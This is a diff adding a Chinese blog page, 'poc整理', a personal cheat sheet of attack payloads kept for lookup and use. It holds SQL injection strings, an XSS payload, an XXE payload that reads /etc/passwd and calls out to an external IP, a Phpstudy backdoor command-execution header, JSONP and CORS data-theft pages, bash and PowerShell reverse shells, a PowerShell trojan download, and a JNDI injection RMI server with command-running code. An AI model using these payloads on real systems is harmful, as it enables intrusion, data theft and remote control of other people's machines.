@@ -1,0 +1,421 @@
+<!DOCTYPE html>
+
+
+  <html class="light page-post">
+
+
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="utf-8">
+  
+  <title>poc整理 | Hexo</title>
+
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  
+    <meta name="keywords" content="web安全，app安全，咸鱼">
+  
+
+  <meta name="description" content="POC整理这里整理一些poc方便平时查询与使用 sql1常用字段:database()               //获取当前数据库version()                //获取数据库版本user()                   //获取用户@@datadir                //获取数据库路径@@version_compile_os     //获取操作系统@">
+<meta property="og:type" content="article">
+<meta property="og:title" content="poc整理">
+<meta property="og:url" content="http://yoursite.com/2020/03/02/poc整理/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="POC整理这里整理一些poc方便平时查询与使用 sql1常用字段:database()               //获取当前数据库version()                //获取数据库版本user()                   //获取用户@@datadir                //获取数据库路径@@version_compile_os     //获取操作系统@">
+<meta property="og:locale" content="en">
+<meta property="og:image" content="https://p4.ssl.qhimg.com/t01eb18cc78117e5c93.png">
+<meta property="og:updated_time" content="2020-03-02T11:51:11.267Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="poc整理">
+<meta name="twitter:description" content="POC整理这里整理一些poc方便平时查询与使用 sql1常用字段:database()               //获取当前数据库version()                //获取数据库版本user()                   //获取用户@@datadir                //获取数据库路径@@version_compile_os     //获取操作系统@">
+<meta name="twitter:image" content="https://p4.ssl.qhimg.com/t01eb18cc78117e5c93.png">
+
+  
+
+  
+    <link rel="icon" href="/favicon.ico">
+  
+
+  <link href="/css/styles.css?v=c114cbeddx" rel="stylesheet">
+
+
+  
+    <link rel="stylesheet" href="/css/personal-style.css">
+  
+
+  
+<!-- Google Analytics -->
+<script type="text/javascript">
+(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+})(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+ga('create', 'UA-38189205-1', 'auto');
+ga('send', 'pageview');
+
+</script>
+<!-- End Google Analytics -->
+
+
+  
+  <script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "//hm.baidu.com/hm.js?57e94d016e201fba3603a8a2b0263af0";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+  
+  <script type="text/javascript">
+	(function(){
+	    var bp = document.createElement('script');
+	    var curProtocol = window.location.protocol.split(':')[0];
+	    if (curProtocol === 'https') {
+	        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
+	    }
+	    else {
+	        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+	    }
+	    var s = document.getElementsByTagName("script")[0];
+	    s.parentNode.insertBefore(bp, s);
+	})();
+  </script>
+
+
+
+  
+    <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <link rel="stylesheet" href="//cdn.bootcss.com/font-awesome/4.3.0/css/font-awesome.min.css">
+  
+
+</head>
+</html>
+<body>
+
+
+  
+    <span id="toolbox-mobile" class="toolbox-mobile">盒子</span>
+  
+
+  <div class="post-header CENTER">
+   
+  <div class="toolbox">
+    <a class="toolbox-entry" href="/">
+      <span class="toolbox-entry-text">盒子</span>
+      <i class="icon-angle-down"></i>
+      <i class="icon-home"></i>
+    </a>
+    <ul class="list-toolbox">
+      
+        <li class="item-toolbox">
+          <a
+            class="CIRCLE"
+            href="/archives/"
+            rel="noopener noreferrer"
+            target="_self"
+            >
+            博客
+          </a>
+        </li>
+      
+        <li class="item-toolbox">
+          <a
+            class="CIRCLE"
+            href="/category/"
+            rel="noopener noreferrer"
+            target="_self"
+            >
+            分类
+          </a>
+        </li>
+      
+        <li class="item-toolbox">
+          <a
+            class="CIRCLE"
+            href="/tags/"
+            rel="noopener noreferrer"
+            target="_self"
+            >
+            标签
+          </a>
+        </li>
+      
+        <li class="item-toolbox">
+          <a
+            class="CIRCLE"
+            href="/link/"
+            rel="noopener noreferrer"
+            target="_self"
+            >
+            友链
+          </a>
+        </li>
+      
+        <li class="item-toolbox">
+          <a
+            class="CIRCLE"
+            href="/atom.xml"
+            rel="noopener noreferrer"
+            target="_blank"
+            >
+            RSS
+          </a>
+        </li>
+      
+        <li class="item-toolbox">
+          <a
+            class="CIRCLE"
+            href="/search/"
+            rel="noopener noreferrer"
+            target="_self"
+            >
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  </div>
+
+
+</div>
+
+
+  <div id="toc" class="toc-article">
+    <strong class="toc-title">Posts List</strong>
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#POC整理"><span class="toc-text">POC整理</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#sql"><span class="toc-text">sql</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XSS"><span class="toc-text">XSS</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#xxe"><span class="toc-text">xxe</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Clickjacking"><span class="toc-text">Clickjacking</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Phpstudy后门"><span class="toc-text">Phpstudy后门</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#JSONP"><span class="toc-text">JSONP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CORS"><span class="toc-text">CORS</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#反弹shell"><span class="toc-text">反弹shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#cmd下使用powershell上传木马"><span class="toc-text">cmd下使用powershell上传木马</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#powershell反弹"><span class="toc-text">powershell反弹</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ceye"><span class="toc-text">ceye</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#jndi注入"><span class="toc-text">jndi注入</span></a></li></ol></li></ol>
+  </div>
+
+
+
+<div class="content content-post CENTER">
+   <article id="post-poc整理" class="article article-type-post" itemprop="blogPost">
+  <header class="article-header">
+    <h1 class="post-title">poc整理</h1>
+
+    <div class="article-meta">
+      <span>
+        <i class="icon-calendar"></i>
+        <span>2020.03.02</span>
+      </span>
+
+      
+        <span class="article-author">
+          <i class="icon-user"></i>
+          <span>John Doe</span>
+        </span>
+      
+
+      
+
+
+      
+
+      
+      <i class="fa fa-eye"></i> 
+        <span id="busuanzi_container_page_pv">
+           &nbsp热度 <span id="busuanzi_value_page_pv">
+           <i class="fa fa-spinner fa-spin"></i></span>℃
+        </span>
+      
+      
+    </div>
+  </header>
+
+  <div class="article-content">
+    
+      <h1 id="POC整理"><a href="#POC整理" class="headerlink" title="POC整理"></a>POC整理</h1><p>这里整理一些poc方便平时查询与使用</p>
+<h2 id="sql"><a href="#sql" class="headerlink" title="sql"></a>sql</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">常用字段:database()               //获取当前数据库version()                //获取数据库版本user()                   //获取用户@@datadir                //获取数据库路径@@version_compile_os     //获取操作系统@@basedir                //mysql安装路径session_user()           //获取连接数据库的用户名current_user()           //获取当前用户名system_user()            //获取系统用户名盲注:bool:and ((select ascii(substr(database(),&quot;从第m个字符开始截取&quot;,&quot;截取长度&quot;)))&gt;&quot;ascii值&quot;)时间盲注:if(ascii(substr((user()),1,1))=115,true,false)报错注入:and(updatexml(1,concat(0x7e,(select database())),0));&apos;&amp;&amp;&apos;9&apos;xor&apos;0&apos;and(1)=&apos;11&apos;||&apos;a1&apos;&amp;sleep(1)</span><br></pre></td></tr></table></figure>
+
+<h2 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg/onload=alert(1)&gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="xxe"><a href="#xxe" class="headerlink" title="xxe"></a>xxe</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY &gt;&lt;!ENTITY % file SYSTEM &quot;file:///etc/passwd&quot;&gt;&lt;!ENTITY % remote SYSTEM &quot;http://120.79.91.29/evil.dtd&quot;&gt;%remote;%all;]&gt;&lt;foo&gt;    &lt;code&gt;&amp;send;&lt;/code&gt;    &lt;msg&gt;mypass&lt;/msg&gt;&lt;/foo&gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="Clickjacking"><a href="#Clickjacking" class="headerlink" title="Clickjacking"></a>Clickjacking</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;&lt;head&gt;&lt;title&gt;Clickjacking&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;iframe src=&quot;http://***&quot; width=&quot;1200&quot; height=&quot;600&quot; /&gt;&lt;/body&gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="Phpstudy后门"><a href="#Phpstudy后门" class="headerlink" title="Phpstudy后门"></a>Phpstudy后门</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Accept-Encoding:gzip,deflateAccept-Charset:c3lzdGVtKCd3aG9hbWknKTs=(whoami)</span><br></pre></td></tr></table></figure>
+
+<h2 id="JSONP"><a href="#JSONP" class="headerlink" title="JSONP"></a>JSONP</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;function useUserInfo(v)&#123;  alert(v.username);&#125;&lt;/script&gt;&lt;script src=&quot;http://www.test.com/userinfo?callback=&quot;返回名&quot;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="CORS"><a href="#CORS" class="headerlink" title="CORS"></a>CORS</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;CORS&lt;/title&gt; &lt;meta charset=&quot;utf-8&quot;&gt;&lt;/head&gt;&lt;body&gt; &lt;script type=&quot;text/javascript&quot;&gt;  var xhr = new XMLHttpRequest();  xhr.onreadystatechange = function()&#123;      if (xhr.readyState==4 &amp;&amp; xhr.status==200)&#123;    alert(xhr.responseText);   &#125;  &#125;  xhr.open(&quot;POST&quot;,&apos;https://链接&apos;,true);  xhr.send(&quot;参数&quot;); &lt;/script&gt;&lt;/body&gt;&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h2><p>bash -i &gt;&amp; /dev/tcp/192.168.1.1/8080 0&gt;&amp;1</p>
+<p><img src="https://p4.ssl.qhimg.com/t01eb18cc78117e5c93.png" alt="http://p6.qhimg.com/t013e425e5510c369cc.png"></p>
+<h2 id="cmd下使用powershell上传木马"><a href="#cmd下使用powershell上传木马" class="headerlink" title="cmd下使用powershell上传木马"></a>cmd下使用powershell上传木马</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell $client = new-object System.Net.WebClient;$client.DownloadFile(&apos;木马地址&apos;,&apos;文件名&apos;)</span><br></pre></td></tr></table></figure>
+
+<h2 id="powershell反弹"><a href="#powershell反弹" class="headerlink" title="powershell反弹"></a>powershell反弹</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell -nop -c &quot;$client = New-Object System.Net.Sockets.TCPClient(&apos;172.20.180.123&apos;,18888);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%&#123;0&#125;;while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)&#123;;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + &apos;PS &apos; + (pwd).Path + &apos;&gt; &apos;;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()&#125;;$client.Close()&quot;</span><br></pre></td></tr></table></figure>
+
+<h3 id="ceye"><a href="#ceye" class="headerlink" title="ceye"></a>ceye</h3><p>2sj3tw.ceye.io</p>
+<h2 id="jndi注入"><a href="#jndi注入" class="headerlink" title="jndi注入"></a>jndi注入</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">import com.sun.jndi.rmi.registry.ReferenceWrapper;</span><br><span class="line">import javax.naming.Reference;</span><br><span class="line">import java.rmi.registry.Registry;</span><br><span class="line">import java.rmi.registry.LocateRegistry;</span><br><span class="line"></span><br><span class="line">public class SERVER &#123;</span><br><span class="line"></span><br><span class="line">    public static void main(String args[]) throws Exception &#123;</span><br><span class="line"></span><br><span class="line">        Registry registry = LocateRegistry.createRegistry(1099);</span><br><span class="line">        Reference aa = new Reference(&quot;ExecTest&quot;, &quot;ExecTest&quot;, &quot;http://127.0.0.1:8081/&quot;);</span><br><span class="line">        ReferenceWrapper refObjWrapper = new ReferenceWrapper(aa);</span><br><span class="line">        System.out.println(&quot;Binding &apos;refObjWrapper&apos; to &apos;rmi://127.0.0.1:1099/aa&apos;&quot;);</span><br><span class="line">        registry.bind(&quot;aa&quot;, refObjWrapper);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">import javax.naming.Context;</span><br><span class="line">import javax.naming.Name;</span><br><span class="line">import javax.naming.spi.ObjectFactory;</span><br><span class="line">import java.io.IOException;</span><br><span class="line">import java.util.Hashtable;</span><br><span class="line"></span><br><span class="line">public class ExecTest implements ObjectFactory &#123;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable&lt;?, ?&gt; environment) &#123;</span><br><span class="line">        exec(&quot;xterm&quot;);</span><br><span class="line">        return null;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static String exec(String cmd) &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            Runtime.getRuntime().exec(&quot;calc.exe&quot;);</span><br><span class="line">        &#125; catch (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        return &quot;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        exec(&quot;123&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+    
+  </div>
+
+</article>
+
+
+   
+
+   
+  <div class="box-prev-next clearfix">
+    <a class="show pull-left" href="/2020/02/28/java代码安全/">
+        <i class="icon icon-angle-left"></i>
+    </a>
+    <a class="show pull-right" href="/2020/03/03/主机安全/">
+        <i class="icon icon-angle-right"></i>
+    </a>
+  </div>
+
+
+
+
+</div>
+
+
+  <a id="backTop" class="back-top">
+    <i class="icon-angle-up"></i>
+  </a>
+
+
+
+
+  <div class="modal" id="modal">
+  <span id="cover" class="cover hide"></span>
+  <div id="modal-dialog" class="modal-dialog hide-dialog">
+    <div class="modal-header">
+      <span id="close" class="btn-close">Close</span>
+    </div>
+    <hr>
+    <div class="modal-body">
+      <ul class="list-toolbox">
+        
+          <li class="item-toolbox">
+            <a
+              class="CIRCLE"
+              href="/archives/"
+              rel="noopener noreferrer"
+              target="_self"
+              >
+              博客
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a
+              class="CIRCLE"
+              href="/category/"
+              rel="noopener noreferrer"
+              target="_self"
+              >
+              分类
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a
+              class="CIRCLE"
+              href="/tags/"
+              rel="noopener noreferrer"
+              target="_self"
+              >
+              标签
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a
+              class="CIRCLE"
+              href="/link/"
+              rel="noopener noreferrer"
+              target="_self"
+              >
+              友链
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a
+              class="CIRCLE"
+              href="/atom.xml"
+              rel="noopener noreferrer"
+              target="_blank"
+              >
+              RSS
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a
+              class="CIRCLE"
+              href="/search/"
+              rel="noopener noreferrer"
+              target="_self"
+              >
+              搜索
+            </a>
+          </li>
+        
+      </ul>
+
+    </div>
+  </div>
+</div>
+
+
+
+  
+      <div class="fexo-comments comments-post">
+    
+
+    
+
+    
+    
+
+    
+
+    
+    
+
+    
+
+  </div>
+
+  
+
+  <script type="text/javascript">
+  function loadScript(url, callback) {
+    var script = document.createElement('script')
+    script.type = 'text/javascript';
+
+    if (script.readyState) { //IE
+      script.onreadystatechange = function() {
+        if (script.readyState == 'loaded' ||
+          script.readyState == 'complete') {
+          script.onreadystatechange = null;
+          callback();
+        }
+      };
+    } else { //Others
+      script.onload = function() {
+        callback();
+      };
+    }
+
+    script.src = url;
+    document.getElementsByTagName('head')[0].appendChild(script);
+  }
+
+  window.onload = function() {
+    loadScript('/js/bundle.js?235683', function() {
+      // load success
+    });
+  }
+</script>
+
+</body>
+</html>
